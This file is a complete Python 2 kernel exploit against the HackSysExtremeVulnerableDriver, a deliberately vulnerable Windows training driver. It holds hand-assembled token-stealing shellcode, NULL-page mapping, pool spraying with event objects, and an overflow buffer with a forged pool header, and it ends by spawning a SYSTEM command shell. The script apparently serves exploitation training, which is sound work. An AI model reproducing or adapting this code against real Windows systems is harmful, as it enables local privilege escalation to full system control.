import ctypes, sys, struct
from subprocess import *
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll

#Set the kernel dll
kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)

#This will define the CTL_CODE
ctl_code = hex((0x00000022 << 16) | (0x00000000 << 14) | (0x803 << 2) | 0x00000003)
print "\n[*]             CTL code is: " + ctl_code + "              [*]" 

#System Token Stealing Payload
print "[*]             Stealing SYSTEM Token                  [*]"

shellcode = ""
shellcode += bytearray( 
		"\x90\x90\x90\x90"		  		  # Nop Sled
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]         |Offset to _EProcess
        "\x89\xc1"                        # mov ecx,eax                |Copy _EProcess into ecx
        "\xba\x04\x00\x00\x00"            # mov edx,0x4                |SYSTEM PID Always 4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]         |Search for SYSTEM Process
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8 
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx         |Compare if PID == 4
        "\x75\xed"                        # jnz 0x1a                   |Jump Back to Search Function if PID != 4
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]         |Copy SYSTEM Token into EDX
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx         |Overwrite with System Token
        "\x61"                            # popad
        "\xC2\x10\x00")                   # ret 0x10                   |Restore Execution Flow

print "[*]          VirtualAlloc() to Bypass DEP              [*]"

#VirtualAlloc to Bypass DEP
pointer = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(pointer),buff,c_int(len(shellcode)))
print "[*]        Address of ring0 shellcode: {0}        [*]".format(hex(pointer))

#Allocating Null Page

null_page = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
if null_page != 0x0:
	print "[\]          Did Not Allocate Null Page!              [\]"
	sys.exit(-1)
else:
	print "[*]          Null Page Has Been Allocated              [*]"
		
#Writing the ring0 pointer into the location in the mapped NULL page, so as to call the CloseProcedure @ 0x60. 
print "[*]  Writing ring0 pointer {0} in location 0x60   [*]".format(hex(pointer))
if not kernel32.WriteProcessMemory(0xFFFFFFFF, 0x60, byref(c_void_p(pointer)), 0x4, byref(c_ulong())):
	print "\t[+] Failed to write at 0x60 location"
	sys.exit(-1)		

kernel32.WriteProcessMemory(0xFFFFFFFF, 0x60, byref(c_void_p(pointer)), 0x4, byref(c_ulong()))


exploit = "A" * 504 # Buffer Size
exploit += struct.pack("L", 0x04080040) #Pool Header
exploit += struct.pack("L", 0xEE657645)
exploit += struct.pack("L", 0x00000000)
exploit += struct.pack("L", 0x00000040)
exploit += struct.pack("L", 0x00000000)
exploit += struct.pack("L", 0x00000000)
exploit += struct.pack("L", 0x00000001)
exploit += struct.pack("L", 0x00000001)
exploit += struct.pack("L", 0x00000000)
exploit += struct.pack("L", 0x00080000) # Type Index
exploit_ad = id(exploit) + 20

event_spray1 = []
event_spray2 = []

print "[*]        Spraying Pool With CreateEventA             [*]"
for i in xrange(10000):
	event_spray1.append(kernel32.CreateEventA(None, False, False, None))
for i in xrange(5000):
	event_spray2.append(kernel32.CreateEventA(None, False, False, None))

 
print "[*]         Creating Holes in Sprayed Pool             [*]"
for i in xrange(0, len(event_spray2), 16):
	for j in xrange(0, 8, 1):
		kernel32.CloseHandle(event_spray2[i+j])


print "[*]              Sending Exploit!!!                    [*]"
kernel32.DeviceIoControl(hevDevice, 0x22200f, exploit_ad, len(exploit), None, 0, byref(c_ulong()), None)

print "[*]           Calling the CloseProcedure()             [*]"
for i in xrange(0, len(event_spray1)):
	kernel32.CloseHandle(event_spray1[i])
 
for i in xrange(8, len(event_spray2), 16):
	for j in xrange(0, 8, 1):
		kernel32.CloseHandle(event_spray2[i + j])
		
		
print "[*]           Popping a NT/System Shell!!!             [*]"
Popen("start cmd", shell=True)

